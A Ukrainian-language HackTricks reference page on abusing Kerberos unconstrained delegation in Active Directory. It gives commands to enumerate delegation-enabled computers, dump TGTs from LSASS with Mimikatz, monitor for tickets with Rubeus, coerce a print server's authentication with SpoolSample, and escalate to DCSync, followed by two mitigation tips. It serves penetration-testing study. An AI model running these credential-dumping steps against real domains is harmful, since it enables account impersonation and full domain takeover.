# Unconstrained Delegation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Unconstrained delegation

Це функція, яку адміністратор домену може налаштувати для будь-якого **комп'ютера** в домені. Тоді, щоразу, коли **користувач входить** на комп'ютер, **копія TGT** цього користувача буде **надіслана всередині TGS**, наданого DC **і збережена в пам'яті в LSASS**. Отже, якщо у вас є привілеї адміністратора на машині, ви зможете **вивантажити квитки та видавати себе за користувачів** на будь-якій машині.

Отже, якщо адміністратор домену входить на комп'ютер з активованою функцією "Unconstrained Delegation", і у вас є локальні адміністративні привілеї на цій машині, ви зможете вивантажити квиток і видавати себе за адміністратора домену будь-де (підвищення привілеїв домену).

Ви можете **знайти об'єкти комп'ютерів з цим атрибутом**, перевіряючи, чи атрибут [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) містить [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx). Ви можете зробити це за допомогою LDAP-фільтра ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, що робить powerview:

<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
## Powerview
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Export tickets with Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Check every 10s for new TGTs</code></pre>

Завантажте квиток адміністратора (або користувача-жертви) в пам'ять за допомогою **Mimikatz** або **Rubeus для** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Більше інформації: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Більше інформації про Unconstrained delegation на ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

Якщо зловмисник зможе **зламати комп'ютер, дозволений для "Unconstrained Delegation"**, він може **обманути** **сервер друку**, щоб **автоматично увійти** на нього, **зберігаючи TGT** в пам'яті сервера.\
Тоді зловмисник зможе виконати **атаку Pass the Ticket, щоб видавати себе за** обліковий запис комп'ютера сервера друку.

Щоб змусити сервер друку увійти на будь-яку машину, ви можете використовувати [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Якщо TGT отримано від контролера домену, ви можете виконати [**DCSync attack**](acl-persistence-abuse/#dcsync) і отримати всі хеші з DC.\
[**Більше інформації про цю атаку на ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Ось інші способи спробувати примусити аутентифікацію:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Зменшення ризиків

* Обмежте входи DA/Admin до конкретних сервісів
* Встановіть "Обліковий запис є чутливим і не може бути делегований" для привілейованих облікових записів.

{% hint style="success" %}
Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}
